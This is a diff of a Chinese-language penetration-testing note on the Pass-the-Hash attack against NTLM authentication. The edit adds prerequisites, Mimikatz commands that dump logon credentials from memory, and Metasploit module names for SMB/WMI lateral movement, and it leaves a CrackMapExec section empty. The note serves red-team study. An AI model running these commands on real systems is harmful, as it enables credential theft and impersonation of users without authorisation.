@@ -1,42 +1,32 @@
 ---
-description: 基于NTLM认证 / 不需要知道明文密码 / 较旧的系统
+description: 基于NTLM认证 / 不需要知道明文密码 / 较旧的且使用NTLM协议的系统
 ---
 
 # ✔️ 哈希传递 - Pass The Hash
 
 ## 先决条件
 
-* 先要找到与账号相关的密码散列 (NTLM Hash)
-*
-
-
+* 需要找到目标用户账户的NTLM哈希
+* 目标域名
+* 目标系统必须支持SMB / WMI / RPC 等远程认证协议
 
 ## 具体实现
 
 ### 技术原理
 
 * 利用已知哈希值来进行身份验证，不需要知道账户的明文密码
-*
-
-
-
-### 实现步骤
-
-
-
-
 
 ## 常用工具
 
-### Mimikatz
+### mimikatz.exe
 
 ```powershell
 mimikatz.exe
+# 权限提升
 privilege::debug
+
 sekurlsa::logonpasswords full
 ```
-
-
 
 ### Impacket
 
@@ -46,16 +36,27 @@ sekurlsa::logonpasswords full
 
 ### Crackmapexec
 
-*
+```bash
+# 
+```
+
+
 
 ### Metasploit
 
-*
-
-
+```bash
+# psexec模块
+use exploit/windows/smb/psexec
+# wmiexec模块
+use auxiliary/admin/smb/wmiexec
+# smb_login模块
+use auxiliary/scanner/smb/smb_login
+# smbexec模块
+use exploit/windows/smb/smbexec
+```
 
 
 
 {% hint style="info" %}
-哈希传递攻击的本质就是冒充其他用户。
+哈希传递攻击分为针对本地用户账户和域用户账户，通过抓取目标用户的NTLM哈希来绕过明文密码登录，其本质就是冒充特定的用户账户。
 {% endhint %}
